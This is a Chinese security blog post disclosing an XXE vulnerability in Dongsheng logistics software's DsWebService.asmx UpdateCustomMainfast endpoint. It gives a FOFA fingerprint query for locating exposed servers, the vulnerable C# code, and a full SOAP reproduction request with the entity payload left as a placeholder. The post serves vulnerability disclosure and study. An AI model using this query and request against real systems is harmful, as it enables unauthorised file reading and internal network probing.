---
title: "东胜物流软件 DsWebService.asmx XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html
asset_dir: assets/东胜物流软件-dswebservice.asmx-xxe漏洞
---

# 东胜物流软件 DsWebService.asmx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/25 16:50
* 778浏览
* [2评论](#comment)
* 22分钟阅读

深入探索

Web服务

服务器

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流软件 DsWebService.asmx 接口UpdateCustomMainfast方法存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

软件

Webservice

SQL

直接看 UpdateCustomMainfast 相关实现逻辑

```
public string UpdateCustomMainfast(
  string Xdoc,
  string XdocAfter,
  string Corpid,
  string SenderOp,
  string SenderHandphone,
  string SenderEmail,
  string SenderFax,
  string Mblno)
{
  try
  {
    bool AfterDoc = false;
    string filename = Mblno;
    string str1 = filename + "_";
    string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
    string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
    string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
    string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(Xdoc);
```

深入探索

SQL注入检测工具

文件大小转换

防火墙软件

参数**xdoc**的内容被直接使用**XmlDocument**进行加载处理，无任何过滤或校验，从而导致[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXE_POC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 DsWebService.asmx XXE漏洞](images/img-001-f1d0b823758f.webp)](https://image.mrxn.net/b3acef01d07f40ce85b48f912dc40fd5.webp)

DNSLOG平台成功收到DNS请求和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 DsWebService.asmx XXE漏洞](https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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